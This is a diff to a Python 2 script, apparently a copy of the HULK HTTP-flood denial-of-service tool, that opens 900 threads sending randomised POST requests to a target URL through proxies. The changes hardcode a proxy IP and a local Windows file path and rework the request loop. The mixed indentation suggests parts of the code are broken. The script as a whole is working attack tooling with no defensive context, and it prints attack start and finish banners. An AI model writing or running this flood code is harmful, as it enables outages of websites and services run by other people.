@@ -22,7 +22,7 @@ headers_referers=[]
 request_counter=0
 flag=0
 safe=0
-F = open('proxy.txt')
+F = open('C:\Users\laris\OneDrive\Bureaublad\proxy.txt')
 ips = F.read().split('\n')
 F.close()
 def inc_counter():
@@ -75,10 +75,9 @@ def usage():
 	print('---------------------------------------------------')
 	print('USAGE: python thog.py <url>')
 	print('you can add "safe" after url, to autoshut after dos')
-	print('---------------------------------------------------')
+	print('---------------------------------------------------')	
 
 
-#http request
 def httpcall(url):
 	useragent_list()
 	referer_list()
@@ -87,59 +86,48 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = urllib2.Request(url + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Host',host)
-	request.get_method = lambda: "POST"
-	bytes = 65535
-	for n in range(1, 9999):
-		if n % 10 == 0:
-			
-	               #print 'size: '+str(len(ips))+'\n'
-	               index = random.randint(0,len(ips)-1)
-	               #print 'http:'+ips[index];
-	               proxy = urllib2.ProxyHandler({'http':ips[index]})#proxy = urllib2.ProxyHandler({'http':random.choice(ips)})
-	               opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
-	               urllib2.install_opener(opener)
-	               try:
-		              if n % 10 == 0:
-			      urllib2.urlopen(request) * bytes
-	               except socket.error as e:
-			      #print e.code
-			 
-		
-			      code=500
+        request.get_method = lambda: "POST"
+        proxy_support = urllib2.ProxyHandler({"http": "http://64.233.165.103:80"})
+        opener = urllib2.build_opener(proxy_support)
+
+        urllib2.install_opener(opener)
+	try:
+			urllib2.urlopen(request)
+	except:
+			#print e.code
+			set_flag(1)
+			print 'Response Code 500'
+			code=500
+	else:
+			inc_counter()
+			urllib2.urlopen(request)
+	return(code)		
+
 	
-			      print "500 Internal Server Error..."
-	                else:
-			      inc_counter()
-			      urllib2.urlopen(request)
-	                return(code)		
-
-
 #http caller thread 
 class HTTPThread(threading.Thread):
 	def run(self):
 		try:
-			while True:
-				
-					code=httpcall(url)
-					
-					
-				
-				
-					
-		except:
+			while flag<2:
+				code=httpcall(url)
+				if (code==500) & (safe==1):
+					set_flag(2)
+		except Exception, ex:
 			pass
 
 # monitors http threads and counts requests
 class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
-		while True:
-			
-
-			print "Rps: %d" % bytes
+		while flag==0:
+			if (previous+100<request_counter) & (previous<>request_counter):
+				print "%d Requests Sent" % (request_counter)
+				previous=request_counter
+		if flag==2:
+			print "\n-- HULK Attack Finished --"
 
 #execute 
 if len(sys.argv) < 2:
@@ -150,7 +138,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print("-- HULK Attack Started --")
+		print "-- HULK Attack Started --"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
@@ -159,11 +147,9 @@ else:
 			url = url + "/"
 		m = re.search('(https?\://)?([^/]*)/?.*', url)
 		host = m.group(2)
-		for i in xrange(bytes):
-                        
+		for i in range(900):
 			t = HTTPThread()
 			t.start()
 		t = MonitorThread()
 		t.start()
-		time.sleep(1)
  
